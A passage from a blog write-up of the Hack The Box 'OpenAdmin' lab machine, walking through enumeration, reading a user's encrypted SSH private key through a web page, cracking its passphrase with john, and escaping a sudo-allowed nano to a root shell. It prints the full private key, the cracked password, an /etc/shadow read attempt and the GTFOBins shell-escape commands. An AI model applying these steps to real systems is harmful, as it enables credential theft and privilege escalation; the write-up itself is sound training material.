+</span></span><span style=display:flex><span>drwx------ <span style=color:#ae81ff>3</span> jimmy jimmy <span style=color:#ae81ff>4096</span> Nov <span style=color:#ae81ff>21</span> 13:52 .gnupg
+</span></span><span style=display:flex><span>drwxrwxr-x <span style=color:#ae81ff>3</span> jimmy jimmy <span style=color:#ae81ff>4096</span> Nov <span style=color:#ae81ff>22</span> 23:15 .local
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> jimmy jimmy  <span style=color:#ae81ff>807</span> Apr  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2018</span> .profile
+</span></span><span style=display:flex><span>jimmy@openadmin:~$ cat .bash_history
+</span></span><span style=display:flex><span>jimmy@openadmin:~$ cat /etc/shadow
+</span></span><span style=display:flex><span>cat: /etc/shadow: Permission denied
+</span></span><span style=display:flex><span>jimmy@openadmin:~$ sudo !!
+</span></span><span style=display:flex><span>sudo cat /etc/shadow
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> jimmy: 
+</span></span><span style=display:flex><span>jimmy is not in the sudoers file.  This incident will be reported.
+</span></span><span style=display:flex><span>jimmy@openadmin:~$ w
+</span></span><span style=display:flex><span> 20:54:54 up  1:59,  <span style=color:#ae81ff>1</span> user,  load average: 0.09, 0.04, 0.01
+</span></span><span style=display:flex><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span style=display:flex><span>jimmy    pts/0    10.10.14.7       20:53    0.00s  0.05s  0.00s w
+</span></span></code></pre></div><p>I&rsquo;ve run <code>LinEnum.sh</code> script but found nothing unusual. My main focus was redirected to <code>/var/www</code> directory. There was an <code>internal</code> directory exposed by Apache server on <code>52846</code> port.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>jimmy@openadmin:/var$ cat /etc/apache2/sites-enabled/internal.conf 
+</span></span><span style=display:flex><span>Listen 127.0.0.1:52846
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;VirtualHost 127.0.0.1:52846&gt;
+</span></span><span style=display:flex><span>    ServerName internal.openadmin.htb
+</span></span><span style=display:flex><span>    DocumentRoot /var/www/internal
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;IfModule mpm_itk_module&gt;
+</span></span><span style=display:flex><span>AssignUserID joanna joanna
+</span></span><span style=display:flex><span>&lt;/IfModule&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    ErrorLog <span style=color:#e6db74>${</span>APACHE_LOG_DIR<span style=color:#e6db74>}</span>/error.log
+</span></span><span style=display:flex><span>    CustomLog <span style=color:#e6db74>${</span>APACHE_LOG_DIR<span style=color:#e6db74>}</span>/access.log combined
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;/VirtualHost&gt;
+</span></span></code></pre></div><p>And <code>AssignUserID</code> was set to joanna.<br>The directory presented three <code>.php</code> files with one that was particulary interesting.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>jimmy@openadmin:/var/www/internal$ ls
+</span></span><span style=display:flex><span>index.php  logout.php  main.php
+</span></span></code></pre></div><p>The <code>main.php</code> source code presented below had <code>shell_exec('cat /home/joanna/.ssh/id_rsa')</code> directive. This should have cat (and then embed) the private RSA key of user joanna on the visited website.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>jimmy@openadmin:/var$ cat www/internal/main.php 
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> <span style=color:#a6e22e>session_start</span>(); <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span> ($_SESSION[<span style=color:#e6db74>&#39;username&#39;</span>])) { <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Location: /index.php&#34;</span>); }; 
+</span></span><span style=display:flex><span><span style=color:#75715e># Open Admin Trusted
+</span></span></span><span style=display:flex><span><span style=color:#75715e># OpenAdmin
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$output <span style=color:#f92672>=</span> <span style=color:#a6e22e>shell_exec</span>(<span style=color:#e6db74>&#39;cat /home/joanna/.ssh/id_rsa&#39;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;pre&gt;</span><span style=color:#e6db74>$output</span><span style=color:#e6db74>&lt;/pre&gt;&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;html&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;h3&gt;Don&#39;t forget your &#34;ninja&#34; password&lt;/h3&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Click here to logout &lt;a href=&#34;logout.php&#34; tite = &#34;Logout&#34;&gt;Session
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/html&gt;
+</span></span></span></code></pre></div><p>Tried to run <code>main.php</code> on the right port and got pretty meaningful response.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>jimmy@openadmin:/var$ curl -ksi 127.0.0.1:52846/main.php
+</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>302</span> Found
+</span></span><span style=display:flex><span>Date: Thu, <span style=color:#ae81ff>20</span> Feb <span style=color:#ae81ff>2020</span> 21:42:28 GMT
+</span></span><span style=display:flex><span>Server: Apache/2.4.29 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Set-Cookie: PHPSESSID<span style=color:#f92672>=</span>uk2vqsqf0o2kmdghf9vakc87dj; path<span style=color:#f92672>=</span>/
+</span></span><span style=display:flex><span>Expires: Thu, <span style=color:#ae81ff>19</span> Nov <span style=color:#ae81ff>1981</span> 08:52:00 GMT
+</span></span><span style=display:flex><span>Cache-Control: no-store, no-cache, must-revalidate
+</span></span><span style=display:flex><span>Pragma: no-cache
+</span></span><span style=display:flex><span>Location: /index.php
+</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>1902</span>
+</span></span><span style=display:flex><span>Content-Type: text/html; charset<span style=color:#f92672>=</span>UTF-8
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>pre</span>&gt;-----BEGIN RSA PRIVATE KEY-----
+</span></span><span style=display:flex><span>Proc-Type: 4,ENCRYPTED
+</span></span><span style=display:flex><span>DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
+</span></span><span style=display:flex><span>ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
+</span></span><span style=display:flex><span>ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
+</span></span><span style=display:flex><span>6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
+</span></span><span style=display:flex><span>ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
+</span></span><span style=display:flex><span>y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
+</span></span><span style=display:flex><span>9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
+</span></span><span style=display:flex><span>piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
+</span></span><span style=display:flex><span>/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
+</span></span><span style=display:flex><span>40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
+</span></span><span style=display:flex><span>fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
+</span></span><span style=display:flex><span>9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
+</span></span><span style=display:flex><span>X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
+</span></span><span style=display:flex><span>S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
+</span></span><span style=display:flex><span>FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
+</span></span><span style=display:flex><span>Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
+</span></span><span style=display:flex><span>RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
+</span></span><span style=display:flex><span>uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
+</span></span><span style=display:flex><span>1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
+</span></span><span style=display:flex><span>XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
+</span></span><span style=display:flex><span>yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+</span></span><span style=display:flex><span>+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
+</span></span><span style=display:flex><span>qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
+</span></span><span style=display:flex><span>z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
+</span></span><span style=display:flex><span>K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
+</span></span><span style=display:flex><span>-----END RSA PRIVATE KEY-----
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>pre</span>&gt;&lt;<span style=color:#f92672>html</span>&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>h3</span>&gt;Don&#39;t forget your &#34;ninja&#34; password&lt;/<span style=color:#f92672>h3</span>&gt;
+</span></span><span style=display:flex><span>Click here to logout &lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;logout.php&#34;</span> <span style=color:#a6e22e>tite </span><span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Logout&#34;</span>&gt;Session
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>html</span>&gt;
+</span></span></code></pre></div><p>But as presented above the private key was encrypted. There was a hint to remember about <code>ninja</code> password. I didn&rsquo;t remember any, so downloaded <code>john</code> toolkit and <code>rockyou.txt</code> dictionary for the beginning.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~/devp/htb/openadmin ❯  ssh2john things.key joanna.hash
+</span></span><span style=display:flex><span>~/devp/htb/openadmin ❯ john joanna.hash -wordlist<span style=color:#f92672>=</span>/home/rav/tools/SecLists/rockyou.txt 
+</span></span><span style=display:flex><span>Warning: detected hash type <span style=color:#e6db74>&#34;SSH&#34;</span>, but the string is also recognized as <span style=color:#e6db74>&#34;ssh-opencl&#34;</span>
+</span></span><span style=display:flex><span>Use the <span style=color:#e6db74>&#34;--format=ssh-opencl&#34;</span> option to force loading these as that type instead
+</span></span><span style=display:flex><span>Using default input encoding: UTF-8
+</span></span><span style=display:flex><span>Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>SSH <span style=color:#f92672>[</span>RSA/DSA/EC/OPENSSH <span style=color:#f92672>(</span>SSH private keys<span style=color:#f92672>)</span> 32/64<span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>Cost <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>KDF/cipher <span style=color:#f92672>[</span>0<span style=color:#f92672>=</span>MD5/AES 1<span style=color:#f92672>=</span>MD5/3DES 2<span style=color:#f92672>=</span>Bcrypt/AES<span style=color:#f92672>])</span> is <span style=color:#ae81ff>0</span> <span style=color:#66d9ef>for</span> all loaded hashes
+</span></span><span style=display:flex><span>Cost <span style=color:#ae81ff>2</span> <span style=color:#f92672>(</span>iteration count<span style=color:#f92672>)</span> is <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>for</span> all loaded hashes
+</span></span><span style=display:flex><span>Will run <span style=color:#ae81ff>8</span> OpenMP threads
+</span></span><span style=display:flex><span>Note: This format may emit false positives, so it will keep trying even after
+</span></span><span style=display:flex><span>finding a possible candidate.
+</span></span><span style=display:flex><span>Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
+</span></span><span style=display:flex><span>bloodninjas      <span style=color:#f92672>(</span>joanna_ssh.key<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Warning: Only <span style=color:#ae81ff>1</span> candidate left, minimum <span style=color:#ae81ff>8</span> needed <span style=color:#66d9ef>for</span> performance.
+</span></span><span style=display:flex><span>1g 0:00:00:03 DONE <span style=color:#f92672>(</span>2020-02-20 23:59<span style=color:#f92672>)</span> 0.2570g/s 3686Kp/s 3686Kc/s 3686KC/s *7¡Vamos!
+</span></span><span style=display:flex><span>Session completed
+</span></span></code></pre></div><p>Two seconds later <code>john</code> cracked the password: <code>bloodninjas</code>. I&rsquo;ve used in combination with the key and finally logged as <code>joanna</code>! Got <code>user.txt</code> file. So this part of the challenge was done.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~/devp/htb/openadmin ❯ ssh -i things.key joanna@10.10.10.171
+</span></span><span style=display:flex><span>Enter passphrase <span style=color:#66d9ef>for</span> key <span style=color:#e6db74>&#39;things.key&#39;</span>: 
+</span></span><span style=display:flex><span>Welcome to Ubuntu 18.04.3 LTS <span style=color:#f92672>(</span>GNU/Linux 4.15.0-70-generic x86_64<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style=display:flex><span> * Management:     https://landscape.canonical.com
+</span></span><span style=display:flex><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  System information as of Thu Feb <span style=color:#ae81ff>20</span> 22:04:05 UTC <span style=color:#ae81ff>2020</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  System load:  0.0               Processes:             <span style=color:#ae81ff>124</span>
+</span></span><span style=display:flex><span>  Usage of /:   51.2% of 7.81GB   Users logged in:       <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>  Memory usage: 35%               IP address <span style=color:#66d9ef>for</span> ens160: 10.10.10.171
+</span></span><span style=display:flex><span>  Swap usage:   0%
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> * Canonical Livepatch is available <span style=color:#66d9ef>for</span> installation.
+</span></span><span style=display:flex><span>   - Reduce system reboots and improve kernel security. Activate at:
+</span></span><span style=display:flex><span>     https://ubuntu.com/livepatch
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>41</span> packages can be updated.
+</span></span><span style=display:flex><span><span style=color:#ae81ff>12</span> updates are security updates.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Last login: Thu Jan  <span style=color:#ae81ff>2</span> 21:12:40 <span style=color:#ae81ff>2020</span> from 10.10.14.3
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>joanna@openadmin:~$ ls -la
+</span></span><span style=display:flex><span>total <span style=color:#ae81ff>332</span>
+</span></span><span style=display:flex><span>drwxr-x--- <span style=color:#ae81ff>6</span> joanna joanna   <span style=color:#ae81ff>4096</span> Feb <span style=color:#ae81ff>20</span> 22:22 .
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>4</span> root   root     <span style=color:#ae81ff>4096</span> Nov <span style=color:#ae81ff>22</span> 18:00 ..
+</span></span><span style=display:flex><span>lrwxrwxrwx <span style=color:#ae81ff>1</span> joanna joanna      <span style=color:#ae81ff>9</span> Nov <span style=color:#ae81ff>22</span> 18:02 .bash_history -&gt; /dev/null
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> joanna joanna    <span style=color:#ae81ff>220</span> Nov <span style=color:#ae81ff>22</span> 18:00 .bash_logout
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> joanna joanna   <span style=color:#ae81ff>3771</span> Nov <span style=color:#ae81ff>22</span> 18:00 .bashrc
+</span></span><span style=display:flex><span>drwx------ <span style=color:#ae81ff>2</span> joanna joanna   <span style=color:#ae81ff>4096</span> Nov <span style=color:#ae81ff>22</span> 22:42 .cache
+</span></span><span style=display:flex><span>drwx------ <span style=color:#ae81ff>3</span> joanna joanna   <span style=color:#ae81ff>4096</span> Nov <span style=color:#ae81ff>22</span> 22:42 .gnupg
+</span></span><span style=display:flex><span>-rwxrwxr-x <span style=color:#ae81ff>1</span> joanna joanna  <span style=color:#ae81ff>46632</span> Feb <span style=color:#ae81ff>20</span> 22:08 linenum.sh
+</span></span><span style=display:flex><span>drwxrwxr-x <span style=color:#ae81ff>3</span> joanna joanna   <span style=color:#ae81ff>4096</span> Nov <span style=color:#ae81ff>22</span> 18:53 .local
+</span></span><span style=display:flex><span>-rwxrwxr-x <span style=color:#ae81ff>1</span> joanna joanna  <span style=color:#ae81ff>34317</span> Feb <span style=color:#ae81ff>20</span> 22:09 lse.sh
+</span></span><span style=display:flex><span>-rw------- <span style=color:#ae81ff>1</span> joanna joanna      <span style=color:#ae81ff>8</span> Feb <span style=color:#ae81ff>20</span> 22:22 nano.save
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> joanna joanna    <span style=color:#ae81ff>807</span> Nov <span style=color:#ae81ff>22</span> 18:00 .profile
+</span></span><span style=display:flex><span>-rw-rw-r-- <span style=color:#ae81ff>1</span> joanna joanna <span style=color:#ae81ff>204173</span> Feb <span style=color:#ae81ff>20</span> 22:17 report.txt-20-02-20
+</span></span><span style=display:flex><span>drwx------ <span style=color:#ae81ff>2</span> joanna joanna   <span style=color:#ae81ff>4096</span> Nov <span style=color:#ae81ff>23</span> 17:31 .ssh
+</span></span><span style=display:flex><span>-rw-rw-r-- <span style=color:#ae81ff>1</span> joanna joanna     <span style=color:#ae81ff>33</span> Nov <span style=color:#ae81ff>28</span> 09:37 user.txt
+</span></span><span style=display:flex><span>-rw------- <span style=color:#ae81ff>1</span> joanna joanna   <span style=color:#ae81ff>1689</span> Feb <span style=color:#ae81ff>20</span> 22:09 .viminfo
+</span></span><span style=display:flex><span>joanna@openadmin:~$ wc -c user.txt 
+</span></span><span style=display:flex><span><span style=color:#ae81ff>33</span> user.txt
+</span></span></code></pre></div><p>I&rsquo;ve uploaded <code>LinEnum.sh</code> and <code>lse.sh</code> scripts for vertical priviliage escalation. Both scripts found that user joanna can run <code>/bin/nano /opt/priv</code> with <code>SUDO</code> and without the password.</p><h4 id=vertical>Vertical<a href=#vertical class=hanchor arialabel=Anchor>&#8983;</a></h4><p>The <a href=https://gtfobins.github.io/gtfobins/nano/>GTFOBins</a> (this is particulary for <code>nano</code> but there are other awesome too) are snippets for spawning shell by many binaries available on the GNU/Linux machines. This time one of the methods worked for me and allowed to spawn the root shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nano
+</span></span><span style=display:flex><span>^R^X
+</span></span><span style=display:flex><span>reset; sh 1&gt;&amp;<span style=color:#ae81ff>0</span> 2&gt;&amp;<span style=color:#ae81ff>0</span>
+</span></span></code></pre></div><p>And here is the dump of commands used as root. Haven&rsquo;t tried to create more reliable shell since wanted only to gather the output from <code>root.txt</code> file.</p><pre tabindex=0><code>Command to execute: reset; sh 1&gt;&amp;0 2&gt;&amp;0# whoami                                                                      
+rootet Help                                               ^X Read File
+# cat /root.txt                                           M-F New Buffer
+cat: /root.txt: No such file or directory
+# ls
+linenum.sh  lse.sh  nano.save  report.txt-20-02-20  user.txt
+# cd ~
+# ls
+linenum.sh  lse.sh  nano.save  report.txt-20-02-20  user.txt
+# ls /
+bin   cdrom  etc   initrd.img      lib    lost+found  mnt  proc  run   snap  swap.img  tmp  var      vmlinuz.old
+boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   sys       usr  vmlinuz
+# ls /root
+root.txt
+# cat /root/tx
+cat: /root/tx: No such file or directory
+# cat /root/root.txt
+2f907ed450b361b2c2bf4e8795d5b561
+# wc -l /root/root.txt
+1 /root/root.txt
+# wc -c /root/root.txt
+33 /root/root.txt
+</code></pre><p>Which was successfull.</p><h3 id=bottom-line>Bottom line<a href=#bottom-line class=hanchor arialabel=Anchor>&#8983;</a></h3><p>I&rsquo;ve really enjoyed this box. OpenAdmin Challenge was a little bit tricky and all about the <code>enumeration</code>. Nothing fancy and no binary exploitation here. But I&rsquo;ve learned one more time that sometimes provided tools are not reliable.</p><p>Thank you for reading and see ya next time!</p><p>foxtrot_charlie over and out!</p></div></div></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><span>copyright by foxtrot_charlie</span>
+<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://foxtrotlabs.cc/assets/main.js></script><script src=https://foxtrotlabs.cc/assets/prism.js></script></div></body></html>
